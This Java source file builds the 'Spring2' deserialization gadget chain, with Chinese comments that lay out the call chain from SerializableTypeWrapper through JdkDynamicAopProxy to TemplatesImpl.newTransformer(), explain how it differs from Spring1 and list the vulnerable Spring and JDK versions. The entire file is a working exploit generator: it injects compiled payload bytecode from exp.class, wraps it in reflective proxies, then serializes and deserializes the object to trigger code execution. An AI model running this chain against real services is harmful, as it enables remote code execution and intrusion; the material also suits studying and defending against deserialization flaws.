import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.springframework.aop.framework.AdvisedSupport;
import org.springframework.beans.factory.ObjectFactory;
import util.Util;

import javax.xml.transform.Templates;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
/*
 * 构造链:
 *SerializableTypeWrapper$MethodInvokeTypeProvider.readObject()
 *   SerializableTypeWrapper.TypeProvider(Proxy).getType()
 *       AnnotationInvocationHandler.invoke()
 *           ReflectionUtils.invokeMethod()
 *                JdkDynamicAopProxy.invoke()
                        AopUtils.invokeJoinpointUsingReflection()
 *                          TemplatesImpl.newTransformer()
 * */
/*注意:
跟Spring1区别在于使用Spring-aop依赖中的JdkDynamicAopProxy替换Spring-bean中的
AutowireUtils$ObjectFactoryDelegatingInvocationHandler
在AdvisedSupport中有setTarget方法，可以直接将TemplatesImpl实例传进去，在进行代理AdvisedSupport即可
这样的话比Spring1少代理一次
* */
/*依赖版本:
spring-core : 4.1.4.RELEASE
spring-beans : 4.1.4.RELEASE
jdk 1.7
* */
public class Spring2 {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates=new TemplatesImpl();
        Class templatesClass=templates.getClass();
        Field namefield=templatesClass.getDeclaredField("_name");
        namefield.setAccessible(true);
        namefield.set(templates,"dragonkeep");
        Field bytecodefield=templatesClass.getDeclaredField("_bytecodes");
        bytecodefield.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("exp.class"));
        byte[][] codes={code};
        bytecodefield.set(templates,codes);
        Field tfactoryField=templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

        /*在AdvisedSupport中有setTarget方法，可以直接将TemplatesImpl实例传进去，在进行代理AdvisedSupport即可*/
        AdvisedSupport advisedSupport= new AdvisedSupport();
        advisedSupport.setTarget(templates);

        Class<?> annotationInvocationHandlerClass = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> annotationInvocationHandlerConstructor = annotationInvocationHandlerClass.getDeclaredConstructors()[0];
        annotationInvocationHandlerConstructor.setAccessible(true);


        Class<?> JdkDynamicAopProxyClass =
                Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Constructor<?> JdkDynamicAopProxyConstructor =
                JdkDynamicAopProxyClass.getDeclaredConstructors()[0];
        JdkDynamicAopProxyConstructor.setAccessible(true);
        InvocationHandler JdkDynamicAopProxyHandlerHandler =
                (InvocationHandler) JdkDynamicAopProxyConstructor.newInstance(advisedSupport);

        Type typeTemplateProxy = (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
                new Class[]{Type.class, Templates.class}, JdkDynamicAopProxyHandlerHandler);
        HashMap <String,Object> map2 = new HashMap<>();
        map2.put("getType",typeTemplateProxy);

        InvocationHandler newInvocationHandler = (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Target.class, map2);
        Class<?> typeProviderClass = Class.forName("org.springframework.core.SerializableTypeWrapper$TypeProvider");
        Object typeProviderProxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
                new Class[]{typeProviderClass}, newInvocationHandler);
        Class<?>       clazz2 = Class.forName("org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider");
        Constructor<?> cons   = clazz2.getDeclaredConstructors()[0];
        cons.setAccessible(true);

        Object objects = cons.newInstance(typeProviderProxy, Object.class.getMethod("toString"), 0);
        Field  field   = clazz2.getDeclaredField("methodName");
        field.setAccessible(true);
        field.set(objects, "newTransformer");

        Util.serialize(objects);
        Util.unserialize();
    }
}
